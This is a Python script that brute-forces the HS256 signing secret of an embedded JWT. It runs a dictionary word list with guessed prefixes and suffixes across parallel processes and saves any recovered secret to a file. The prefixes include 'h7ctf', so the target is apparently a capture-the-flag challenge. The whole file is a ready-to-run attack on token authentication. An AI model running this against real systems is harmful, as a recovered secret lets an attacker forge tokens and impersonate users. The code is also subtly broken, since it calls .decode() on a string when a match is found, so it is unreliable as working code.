import base64, hashlib, hmac, os, itertools
from multiprocessing import Pool

REF = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMDAxIiwiaWF0IjoxNzkwNDA1MDc3LCJleHAiOjE3OTA0OTE0Nzd9.gqT6WsJe13hA9L7M_viCPQxKiiKoDkNSMk2lc_8_iso"
h0, p0, s0 = REF.split(".")
SIGNING = (h0 + "." + p0).encode()
SIG = base64.urlsafe_b64decode(s0 + "=" * (-len(s0) % 4))

WORDS = [w.strip() for w in open("words_alpha.txt", encoding="utf-8", errors="ignore") if 3 <= len(w.strip()) <= 24]
print("words:", len(WORDS))

SUF = ["", "1", "12", "123", "!", "26", "2026", "2025", "@1", "@123", "#1", "7", "01", "-1"]
PRE = ["", "meridian", "mp", "pay", "the", "secret", "jwt", "hs256", "app", "mobile", "bank", "h7ctf"]

def chunk(rng):
    a, b = rng
    new = hmac.new
    sha = hashlib.sha256
    for i in range(a, b):
        w = WORDS[i]
        for base in (w, w.capitalize(), w.upper()):
            for s in SUF:
                for p in PRE:
                    k = (p + base + s).encode()
                    if hmac.compare_digest(new(k, SIGNING, sha).digest(), SIG):
                        return (p + base + s).decode()
    return None

if __name__ == "__main__":
    N = 12
    step = (len(WORDS) + N - 1) // N
    rngs = [(i*step, min((i+1)*step, len(WORDS))) for i in range(N)]
    with Pool(N) as pool:
        found = None
        for r in pool.imap_unordered(chunk, rngs):
            if r:
                found = r
                pool.terminate()
                break
    if found:
        print("SECRET FOUND:", repr(found))
        open("jwt_secret.txt", "w").write(found)
    else:
        print("no hit in", len(WORDS)*3*len(SUF)*len(PRE), "candidates")
